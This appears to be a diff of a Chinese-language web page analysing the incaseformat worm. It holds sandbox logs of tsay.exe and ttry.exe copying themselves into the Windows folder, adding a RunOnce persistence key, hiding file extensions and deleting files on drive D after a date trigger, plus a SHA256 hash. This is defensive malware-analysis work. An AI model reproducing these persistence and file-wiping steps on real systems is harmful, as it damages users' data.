 16:43:31:823,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
 16:43:31:870,	tsay.exe,	1064:2276,	1064,	FILE_touch,	C:\windows\tsay.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
@@ -2210,14 +2854,14 @@ cmp dword ptr ds:[eax+0xC], 0x220
 16:43:31:886,	tsay.exe,	1064:2276,	1064,	FILE_read,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 16:43:31:901,	tsay.exe,	1064:2276,	1064,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 16:43:31:901,	tsay.exe,	1064:0,	1064,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
-16:43:31:901,	tsay.exe,	1064:2276,	1064,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
-16:43:31:917,	tsay.exe,	1064:0,	1064,	EXEC_destroy,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
+16:43:31:901,	tsay.exe,	1064:2276,	1064,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
+16:43:31:917,	tsay.exe,	1064:0,	1064,	EXEC_destroy,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
 </code></pre><p>将时间设置为1月13日，以管理员权限运行木马程序：</p>
-<pre tabindex="0"><code>16:42:32:202,	tsay.exe,	2568:0,	0,	EXEC_create,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:'&quot;C:\Windows\system32\SystemSettingsAdminFlows.exe&quot; SetDateTime' image_base:0x00007FF6B6C80000 image_size:0x00080000 ,	0x00000000 [操作成功完成。  ],	
+<pre tabindex="0"><code>16:42:32:202,	tsay.exe,	2568:0,	0,	EXEC_create,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:&#39;&#34;C:\Windows\system32\SystemSettingsAdminFlows.exe&#34; SetDateTime&#39; image_base:0x00007FF6B6C80000 image_size:0x00080000 ,	0x00000000 [操作成功完成。  ],	
 16:42:32:499,	tsay.exe,	2568:0,	0,	EXEC_module_load,	C:\Windows\System32\vm3dum64_10.dll,	base:0x00007FFB01970000 size:0x00061000 ,	0x00000000 [操作成功完成。  ],	
-16:42:33:321,	tsay.exe,	2568:6180,	0,	REG_setval,	HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-655661564-3040666061-2252561177-1000\\Device\HarddiskVolume3\Windows\System32\SystemSettingsAdminFlows.exe,	type:0x00000003 datalen:24 data:'28 BB 33 09 88 E9 D6 01 00 00 00 00 00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:42:33:321,	tsay.exe,	2568:0,	0,	EXEC_destroy,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:'&quot;C:\Windows\system32\SystemSettingsAdminFlows.exe&quot; SetDateTime' ,	0x00000000 [操作成功完成。  ],	
-16:45:41:433,	tsay.exe,	2568:0,	2568,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
+16:42:33:321,	tsay.exe,	2568:6180,	0,	REG_setval,	HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-655661564-3040666061-2252561177-1000\\Device\HarddiskVolume3\Windows\System32\SystemSettingsAdminFlows.exe,	type:0x00000003 datalen:24 data:&#39;28 BB 33 09 88 E9 D6 01 00 00 00 00 00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:42:33:321,	tsay.exe,	2568:0,	0,	EXEC_destroy,	C:\Windows\system32\SystemSettingsAdminFlows.exe,	parent_pid:5808 cmdline:&#39;&#34;C:\Windows\system32\SystemSettingsAdminFlows.exe&#34; SetDateTime&#39; ,	0x00000000 [操作成功完成。  ],	
+16:45:41:433,	tsay.exe,	2568:0,	2568,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:464,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:511,	tsay.exe,	2568:0,	2568,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:511,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
@@ -2235,7 +2879,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
-16:45:41:527,	tsay.exe,	2568:4468,	2568,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
+16:45:41:527,	tsay.exe,	2568:4468,	2568,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
@@ -2251,8 +2895,8 @@ cmp dword ptr ds:[eax+0xC], 0x220
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
 16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
-16:45:41:589,	tsay.exe,	2568:0,	2568,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:041,	tsay.exe,	5748:0,	5748,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
+16:45:41:589,	tsay.exe,	2568:0,	2568,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:041,	tsay.exe,	5748:0,	5748,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:135,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:197,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
@@ -2264,24 +2908,24 @@ cmp dword ptr ds:[eax+0xC], 0x220
 16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
-16:48:06:228,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
+16:48:06:228,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
 16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\ttry.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_write,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 16:48:06:244,	tsay.exe,	5748:0,	5748,	FILE_modified,	C:\windows\ttry.exe,	,	0x00000000 [操作成功完成。  ],	
-16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:06:963,	tsay.exe,	5748:0,	5748,	PROC_exec,	C:\windows\ttry.exe,	target_pid:8840 cmdline:'&quot;C:\windows\ttry.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
-16:48:07:010,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475,	type:0x00000003 datalen:446 data:'05 09 00 00 00 00 00 00 04 00 04 00 01 02 06 00 ' ,	0x00000000 [操作成功完成。  ],	
-16:48:07:072,	tsay.exe,	5748:0,	5748,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
+16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:06:963,	tsay.exe,	5748:0,	5748,	PROC_exec,	C:\windows\ttry.exe,	target_pid:8840 cmdline:&#39;&#34;C:\windows\ttry.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:07:010,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475,	type:0x00000003 datalen:446 data:&#39;05 09 00 00 00 00 00 00 04 00 04 00 01 02 06 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+16:48:07:072,	tsay.exe,	5748:0,	5748,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Windows\tsay.exe&#34; &#39; ,	0x00000000 [操作成功完成。  ],	
 </code></pre><p>生成的ttry.exe文件的动作如下：</p>
-<pre tabindex="0"><code>17:18:04:679,	ttry.exe,	9128:0,	9076,	EXEC_create,	C:\windows\ttry.exe,	parent_pid:9076 cmdline:'&quot;C:\windows\ttry.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
+<pre tabindex="0"><code>17:18:04:679,	ttry.exe,	9128:0,	9076,	EXEC_create,	C:\windows\ttry.exe,	parent_pid:9076 cmdline:&#39;&#34;C:\windows\ttry.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
 17:18:04:710,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000075BA0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
 17:18:04:757,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000074810000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
 17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
@@ -2289,23 +2933,23 @@ cmp dword ptr ds:[eax+0xC], 0x220
 17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 17:18:04:757,	ttry.exe,	9128:0,	9076,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
-17:18:04:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
+17:18:04:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:&#39;43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E &#39; ,	0x00000000 [操作成功完成。  ],	
 17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_touch,	D:\share.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000064 ,	0x00000000 [操作成功完成。  ],	
 17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_write,	D:\share.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
 17:18:05:741,	ttry.exe,	9128:0,	9076,	FILE_modified,	D:\share.exe,	,	0x00000000 [操作成功完成。  ],	
-17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:'02 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_rmval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\checkedvalue,	keyname:'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt' ,	0x00000000 [操作成功完成。  ],	
+17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:&#39;02 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_rmval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\checkedvalue,	keyname:&#39;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt&#39; ,	0x00000000 [操作成功完成。  ],	
 </code></pre><p>当时间调整为1月13日，运行ttry.exe动作如下：</p>
 <pre tabindex="0"><code>17:25:44:420,	ttry.exe,	7808:588,	7808,	FILE_truncate,	D:\incaseformat.log,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
 
 ......
 
-17:25:53:524,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-17:25:53:534,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:'02 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
-17:25:53:551,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
+17:25:53:524,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+17:25:53:534,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:&#39;02 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
+17:25:53:551,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
 17:25:54:434,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\$RECYCLE.BIN\S-1-5-21-655661564-3040666061-2252561177-1000\desktop.ini,	,	0x00000000 [操作成功完成。  ],	
 17:25:54:443,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\3rd-party-licenses.txt,	,	0x00000000 [操作成功完成。  ],	
 17:25:54:447,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\ca-bundle.crt,	,	0x00000000 [操作成功完成。  ],	
@@ -2331,7 +2975,6 @@ C:\Windows&gt;certutil -hashfile ttry.exe sha256
 SHA256 的 ttry.exe 哈希:
 8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
 CertUtil: -hashfile 命令成功完成。
-
 </code></pre><h3 id="32查壳情况">3.2查壳情况</h3>
 <p>查一下壳，无壳delphi。</p>
 <p><img src="/inc_images/2696940148582.png" alt=""></p>
